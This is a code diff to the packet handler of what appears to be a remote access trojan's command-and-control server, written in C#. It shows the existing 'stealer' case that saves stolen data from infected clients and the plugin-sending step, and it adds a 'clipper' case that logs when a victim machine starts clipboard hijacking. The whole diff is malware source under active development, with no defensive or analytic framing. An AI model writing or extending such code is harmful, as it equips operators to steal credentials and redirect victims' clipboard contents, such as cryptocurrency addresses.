@@ -32,7 +32,11 @@ namespace Server.Handle_Packet
                                 });
                                 break;
                             }
-
+                        case "init_reg":
+                            {
+                                new HandleLogs().Addmsg($"{client.Ip} Initiated All Dll Plugins.", Color.Red);
+                                break;
+                            }
                         case "Ping":
                             {
                                 new HandlePing().Ping(client, unpack_msgpack);
@@ -165,7 +169,7 @@ namespace Server.Handle_Packet
 
                         case "sendPlugin":
                             {
-                                new HandleLogs().Addmsg($"Sending plugun to {client.Ip} ……", Color.Blue);
+                                new HandleLogs().Addmsg($"Sending Dll plugin to {client.Ip} ……", Color.Blue);
                                 ThreadPool.QueueUserWorkItem(delegate {
                                     client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                                 });
@@ -217,6 +221,12 @@ namespace Server.Handle_Packet
                         case "stealer":
                             {
                                 new HandleStealer().SaveData(client, unpack_msgpack);
+                                break;
+                            }
+                        case "clipper":
+                            {
+                                string hwid = unpack_msgpack.ForcePathObject("Hwid").AsString;
+                                new HandleLogs().Addmsg($"{client.Ip} started Clipper!", Color.Red);
                                 break;
                             }
                     }
